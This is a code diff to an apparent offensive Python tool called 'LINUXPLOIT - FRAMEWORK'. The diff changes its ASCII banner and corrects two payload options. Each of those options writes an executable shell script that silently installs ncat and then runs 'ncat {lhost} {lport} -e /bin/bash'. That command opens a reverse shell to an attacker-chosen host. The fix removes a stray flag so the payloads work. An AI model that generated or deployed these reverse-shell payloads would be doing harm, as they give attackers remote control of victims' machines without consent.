@@ -3,12 +3,13 @@ import click
 import socket
 print(""" 
 
-_____________________ 
-\_   _____/\______   \
- |    __)   |       _/
- |     \    |    |   \
- \___  /    |____|_  /
-     \/            \/ 
+
+ █████╗██████╗ 
+██╔════╝██╔══██╗
+█████╗  ██████╔╝
+██╔══╝  ██╔══██╗
+██║     ██║  ██║
+╚═╝     ╚═╝  ╚═╝
             LINUXPLOIT - FRAMEWORK 
 	       coded by: Febin Rev
 """) 
@@ -66,7 +67,7 @@ elif payload=="4":
 	print("GENERATING PAYLOAD.......")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo yum install nmap-ncat -y > /dev/null
-ncat {lhost} {lport} -e /bin/bash -y > /dev/null
+ncat {lhost} {lport} -e /bin/bash > /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
@@ -75,7 +76,7 @@ elif payload=="5":
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""apt-get install nmap -y > /dev/null
 apt-get install ncat -y > /dev/null
-ncat {lhost} {lport} -e /bin/bash -y > /dev/null
+ncat {lhost} {lport} -e /bin/bash > /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
